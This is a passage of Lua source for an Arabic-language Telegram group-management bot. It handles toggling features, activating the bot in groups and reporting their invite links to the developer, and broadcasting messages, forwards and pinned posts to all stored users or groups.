Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط', 1, 'md')
else 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل البوت الخدمي",'md')
DevHmD:del(DevTwix..'HmD:Lock:FreeBot'..DevTwix) 
end 
end
if text == 'تعطيل البوت الخدمي' and ChCheck(msg) or text == '× تعطيل البوت خدمي ×' and ChCheck(msg) then 
if not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط', 1, 'md')
else 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل البوت الخدمي",'md')
DevHmD:set(DevTwix..'HmD:Lock:FreeBot'..DevTwix,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
if text == 'تعطيل صورتي' and Manager(msg) and ChCheck(msg) then   
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر صورتي بنجاح ",'md')
DevHmD:del(DevTwix..'HmD:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر صورتي بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل الالعاب بنجاح",'md')
DevHmD:del(DevTwix..'HmD:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل الالعاب بنجاح",'md')
DevHmD:set(DevTwix..'HmD:Lock:Games'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" and ChCheck(msg) or text == "تفعيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل جلب رابط المجموعة",'md')
DevHmD:del(DevTwix.."HmD:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
if text == "تعطيل الرابط" and ChCheck(msg) or text == "تعطيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل جلب رابط المجموعة",'md')
DevHmD:set(DevTwix.."HmD:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
if text and (text == "تفعيل حذف الردود" or text == "تفعيل مسح الردود") and ChCheck(msg) then 
if not HmDConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل حذف الردود",'md')
DevHmD:del(DevTwix.."HmD:Lock:GpRd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل حذف الردود" or text == "تعطيل مسح الردود") and ChCheck(msg) then 
if not HmDConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل حذف الردود",'md')
DevHmD:set(DevTwix.."HmD:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
if text and (text == "تفعيل اضف رد" or text == "تفعيل اضافه رد" or text == "تفعيل حذف رد" or text == "تفعيل حذف رد عام" or text == "تفعيل اضف رد عام") and ChCheck(msg) then 
if not HmDConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تفعيل امر اضف رد",'md')
DevHmD:del(DevTwix.."HmD:Lock:Rd"..msg.chat_id_)
return false  
end
end
if text and (text == "تعطيل اضف رد" or text == "تعطيل اضافه رد" or text == "تعطيل حذف رد" or text == "تعطيل حذف رد عام" or text == "تعطيل اضف رد عام") and ChCheck(msg) then 
if not HmDConstructor(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لمالك المجموعه او اعلى فقط ', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم تعطيل امر اضف رد",'md')
DevHmD:set(DevTwix.."HmD:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
---------------------------------------------------------------------------------------
if text and text:match('^تفعيل$') and SudoBot(msg) and ChCheck(msg) then
if ChatType ~= 'sp' then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه عاديه وليست خارقه لا تستطيع تفعيلي يرجى ان تضع سجل رسائل المجموعه ضاهر وليس مخفي ومن بعدها يمكنك رفعي ادمن ثم تفعيلي', 1, 'md')
return false
end
if msg.can_be_deleted_ == false then 
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙البوت ليس ادمن يرجى ترقيتي !', 1, 'md')
return false  
end
tdcli_function ({ ID = "GetChannelFull", channel_id_ = msg.chat_id_:gsub("-100","")}, function(arg,data)  
if tonumber(data.member_count_) < tonumber(DevHmD:get(DevTwix..'HmD:Num:Add:Bot') or 0) and not SecondSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙عدد اعضاء المجموعه اقل من » *'..(DevHmD:get(DevTwix..'HmD:Num:Add:Bot') or 0)..'* عضو', 1, 'md')
return false
end
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function ({ID = "GetChannelMembers",channel_id_ = msg.chat_id_:gsub("-100",""),filter_ = {ID = "ChannelMembersAdministrators"},offset_ = 0,limit_ = 100},function(arg,HmD) 
local admins = HmD.members_
for i=0 , #admins do
if HmD.members_[i].bot_info_ == false and HmD.members_[i].status_.ID == "ChatMemberStatusEditor" then
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevHmD:srem(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevHmD:sadd(DevTwix..'HmD:Admins:'..msg.chat_id_, admins[i].user_id_)
end
if HmD.members_[i].status_.ID == "ChatMemberStatusCreator" then
DevHmD:sadd(DevTwix.."HmD:HMDicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevHmD:sadd(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevHmD:srem(DevTwix.."HmD:HMDicConstructor:"..msg.chat_id_,admins[i].user_id_)
DevHmD:srem(DevTwix.."HmD:HmDConstructor:"..msg.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevHmD:sismember(DevTwix..'HmD:Groups',msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه بالتاكيد مفعله', 1, 'md')
else
local Text = "⋄︙*اسم المجموعة :* "..dp.title_.."\n\n⋄︙*اضغط ادنا لتفعيل البوت فيها*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تفعيل •",callback_data="/AddHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:sadd(DevTwix.."HmD:Groups",msg.chat_id_)
if not DevHmD:get(DevTwix..'HmD:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevHmD:incrby(DevTwix..'HmD:Sudos'..msg.sender_user_id_,1)
DevHmD:set(DevTwix..'HmD:SudosGp'..msg.sender_user_id_..msg.chat_id_,"HmD")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NumMem = data.member_count_
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevHmD:set(DevTwix.."HmD:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"⋄︙*تم تفعيل مجموعه جديده »*  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙بواسطة » "..Name.."\n⋄︙اسم المجموعه » ["..NameChat.."]\n⋄︙عدد اعضاء المجموعه » ( *"..NumMem.."* )\n⋄︙ايدي المجموعه » ( `"..msg.chat_id_.."` )\n⋄︙رابط المجموعه » \n["..LinkGroup.."]\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الوقت *» "..os.date("%I:%M%p").."*\n⋄︙التاريخ *» "..os.date("%Y/%m/%d").."*",0,'md')
end
end
end,nil)
end,nil)
end,nil)
end
if text == 'تعطيل' and SudoBot(msg) and ChCheck(msg) then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevHmD:sismember(DevTwix..'HmD:Groups',msg.chat_id_) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙المجموعه بالتاكيد معطله', 1, 'md')
else
local Text = "⋄︙*اسم المجموعة :* "..dp.title_.."\n\n⋄︙*اضغط ادنا لتعطيل البوت فيها*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• تعطيل •",callback_data="/DelHelpList:"..msg.sender_user_id_}}}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..TokenBot..'/sendMessage?chat_id=' .. msg.chat_id_ .. '&text=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
DevHmD:srem(DevTwix.."HmD:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
else
LinkGroup = 'لا يوجد'
end
DevHmD:set(DevTwix.."HmD:Groups:Links"..msg.chat_id_,LinkGroup) 
if not Sudo(msg) then
SendText(DevId,"⋄︙*تم تعطيل مجموعه جديده »*  \n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙بواسطة » "..Name.."\n⋄︙اسم المجموعه » ["..NameChat.."]\n⋄︙ايدي المجموعه » (`"..msg.chat_id_.."`)\n⋄︙رابط المجموعه » \n["..LinkGroup.."]\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الوقت *» "..os.date("%I:%M%p").."*\n⋄︙التاريخ *» "..os.date("%Y/%m/%d").."*",0,'md')
end
end
end,nil)
end,nil)
end
end
---------------------------------------------------------------------------------------
if text and text:match("^المطور$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
local Name1 = Name1:gsub("`","") 
local Name1 = Name1:gsub("*","") 
local Name1 = Name1:gsub("{","") 
local Name1 = Name1:gsub("}","") 
local Name = '['..Name1..'](tg://user?id='..result.id_..')'
local NameChat = dp.title_
local NameChat = NameChat:gsub('"',"") 
local NameChat = NameChat:gsub("'","") 
local NameChat = NameChat:gsub("`","") 
local NameChat = NameChat:gsub("*","") 
local NameChat = NameChat:gsub("{","") 
local NameChat = NameChat:gsub("}","") 
local LinkGp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..msg.chat_id_))
if LinkGp.ok == true then 
LinkGroup = LinkGp.result
LinkGroup = "⋄︙رابط المجموعه » \n["..LinkGroup.."]"
else
LinkGroup = '⋄︙ليست لدي صلاحية الدعوه لهذه المجموعه !'
end
if not Sudo(msg) then
SendText(DevId,"⋄︙*أهلا عـزيزي المطور هنالك شخص يحتاجك » *\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الشخص » "..Name.."\n⋄︙اسم المجموعه » ["..NameChat.."]\n⋄︙ايدي المجموعه » (`"..msg.chat_id_.."`)\n⋄︙رابط المجموعة » "..LinkGroup.."\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n⋄︙الوقت* » "..os.date("%I:%M%p").."*\n⋄︙التاريخ* » "..os.date("%Y/%m/%d").."*",0,'md')
end
end,nil)
end,nil)
end
---------------------------------------------------------------------------------------
---------------------------------------------------------------------------------------
if text == 'روابط الكروبات' or text == 'روابط المجموعات' or text == '× روابط الكروبات ×' then
if not HmDSudo(msg) then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙للمطور الاساسي فقط ', 1, 'md')
else
local List = DevHmD:smembers(DevTwix.."HmD:Groups")
if #List == 0 then
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙لا توجد مجموعات مفعله', 1, 'md')
else
Dev_HmD(msg.chat_id_, msg.id_, 1, '⋄︙جاري ارسال نسخه تحتوي على » '..#List..' مجموعه', 1, 'md')
local Text = "⋄︙Source DevTwix\n⋄︙File Bot Groups\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
for k,v in pairs(List) do
local GroupsManagers = DevHmD:scard(DevTwix.."HmD:Managers:"..v) or 0
local GroupsAdmins = DevHmD:scard(DevTwix.."HmD:Admins:"..v) or 0
local Groupslink = DevHmD:get(DevTwix.."HmD:Groups:Links" ..v)
Text = Text..k.." ⇠  \n⋄︙Group ID ⇠ "..v.."\n⋄︙Group Link ⇠ "..(Groupslink or "Not Found").."\n⋄︙Group Managers ⇠ "..GroupsManagers.."\n⋄︙Group Admins ⇠ "..GroupsAdmins.."\n•••┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉ ┉•••\n"
end
local File = io.open('GroupsBot.txt', 'w')
File:write(Text)
File:close()
sendDocument(msg.chat_id_, msg.id_, 0, 1, nil, './GroupsBot.txt',dl_cb, nil)
io.popen('rm -rf ./GroupsBot.txt')
end
end
end
---------------------------------------------------------------------------------------
if text == "اذاعه خاص" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "× اذاعة خاص ×" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevHmD:setex(DevTwix.."HmD:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙عزيزي ارسل لي الاذاعه الان :\n\n⋄︙يمكنك ارسال : ( ملف - صوره - متحركة - الخ .. )\n\n⋄︙للخروج ارسل كلمة » الغاء",'md')
return false
end 
if DevHmD:get(DevTwix.."HmD:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevHmD:smembers(DevTwix..'HmD:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
HmDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
HmDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
HmDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
HmDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
HmDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
HmDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
HmDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
HmDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙تم اذاعة "..HmDText.." بنجاح الى » {*"..#List.."*} مشترك\n", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
---------------------------------------------------------------------------------------
if text == "اذاعه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "× اذاعة عامة ×" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevHmD:setex(DevTwix.."HmD:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙عزيزي ارسل لي الاذاعه الان :\n\n⋄︙يمكنك ارسال : ( ملف - صوره - متحركة - الخ .. )\n\n⋄︙للخروج ارسل كلمة » الغاء",'md')
return false
end 
if DevHmD:get(DevTwix.."HmD:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevHmD:smembers(DevTwix..'HmD:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
HmDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
HmDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
HmDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
HmDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
HmDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
HmDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
HmDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
HmDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
end 
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اذاعة "..HmDText.." بنجاح \n⋄︙‏في » ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
---------------------------------------------------------------------------------------
if text == "اذاعه بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "× أذاعة عامة بالتوجية ×" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevHmD:setex(DevTwix.."HmD:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙يمكنك الان ارسال التوجية :\n\n⋄︙للخروج ارسل كلمة » الغاء",'md')
return false
end 
if DevHmD:get(DevTwix.."HmD:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevHmD:smembers(DevTwix..'HmD:Groups')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اذاعة رسالتك بالتوجيه \n⋄︙‏في » ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
---------------------------------------------------------------------------------------
if text == "اذاعه خاص بالتوجيه" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "× أذاعة خاص بالتوجية ×" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevHmD:setex(DevTwix.."HmD:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙يمكنك الان ارسال التوجية :\n⋄︙للخروج ارسل كلمة » الغاء",'md')
return false
end 
if DevHmD:get(DevTwix.."HmD:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevHmD:smembers(DevTwix..'HmD:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اذاعة رسالتك بالتوجيه \n⋄︙‏الى » ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
end
---------------------------------------------------------------------------------------
if text == "اذاعه بالتثبيت" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) or text == "× اذاعة بالتثبيت ×" and msg.reply_to_message_id_ == 0 and SudoBot(msg) and ChCheck(msg) then 
if DevHmD:get(DevTwix.."HmD:Send:Bot"..DevTwix) and not HmDSudo(msg) then 
send(msg.chat_id_, msg.id_,"⋄︙الاذاعه معطله من قبل المطور الاساسي")
return false
end
DevHmD:setex(DevTwix.."HmD:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
Dev_HmD(msg.chat_id_, msg.id_, 1,"⋄︙عزيزي ارسل لي الاذاعه الان :\n\n⋄︙يمكنك ارسال : ( ملف - صوره - متحركة - الخ .. )\n\n⋄︙للخروج ارسل كلمة » الغاء",'md')
return false
end 
if DevHmD:get(DevTwix.."HmD:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevHmD:del(DevTwix.."HmD:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevHmD:smembers(DevTwix.."HmD:Groups") 
if msg.content_.text_ then
for k,v in pairs(List) do 
HmDText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
elseif msg.content_.photo_.sizes_[1] then
photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
for k,v in pairs(List) do 
HmDText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
HmDText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
HmDText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
HmDText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
HmDText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
HmDText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
HmDText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevHmD:set(DevTwix..'HmD:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
Dev_HmD(msg.chat_id_, msg.id_, 1, "⋄︙تم اذاعة "..HmDText.." بالتثبيت \n⋄︙‏في » ❨ "..#List.." ❩ مجموعه \n ✓", 1, 'md')
